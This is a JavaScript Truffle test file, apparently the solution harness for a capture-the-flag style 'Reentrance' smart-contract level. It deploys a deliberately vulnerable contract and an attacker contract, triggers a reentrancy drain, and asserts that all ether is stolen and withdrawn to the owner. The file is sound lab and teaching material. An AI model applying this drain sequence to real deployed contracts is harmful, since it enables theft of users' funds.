/* eslint-disable no-underscore-dangle */
const SolArtifact = artifacts.require('ReentranceSol');
const TargetArtifact = artifacts.require('Reentrance');
const { catchRevert } = require('./exceptionsHelpers.js');


contract('Reentrance', (accounts) => {
  let solContract;
  let targetContract;
  const initialBalance = web3.utils.toWei('1');
  const steal = web3.utils.toWei('0.5');
  const totalBounty = web3.utils.toWei('1.5');
  const owner = accounts[0];

  before(async () => {
    targetContract = await TargetArtifact.new();
    await targetContract.sendTransaction({ value: initialBalance });
    solContract = await SolArtifact.new(targetContract.address, steal);
  });


  it('should steal all the money from Reentrance contract', async () => {
    // Amount transferred initially to Reentrance contract
    const reentranceInitialBalance = await web3.eth.getBalance(targetContract.address);
    assert.equal(reentranceInitialBalance, initialBalance, 'reentrance should be the 1 ether');

    // Amount stated as 'steps' to steal money
    const solDonation = await solContract.amount();
    assert.equal(solDonation, steal, 'solDonation should be the steal amount');

    // Donate money to Reentrance contract
    await targetContract.donate(solContract.address, { value: steal });
    const donationResult = await targetContract.balanceOf(solContract.address);
    assert.equal(donationResult.toString(), steal, 'donationResult should be the donation amount');

    // Attack!!
    await solContract.stealMoney();
    const targetFinalBalance = await web3.eth.getBalance(targetContract.address);
    const solFinalBalance = await web3.eth.getBalance(solContract.address);
    assert.equal(targetFinalBalance.toString(), '0', 'targetFinalBalance should be 0');
    assert.equal(solFinalBalance.toString(), totalBounty, 'donationResult should be the donation amount');

    // Retrieve contract balance
    const currentBalance = await web3.eth.getBalance(owner);
    await solContract.getTheBounty();
    const newBalance = await web3.eth.getBalance(owner);
    assert.equal(currentBalance < newBalance, true, 'newBalance should be bigger than currentBalance');
  });
});
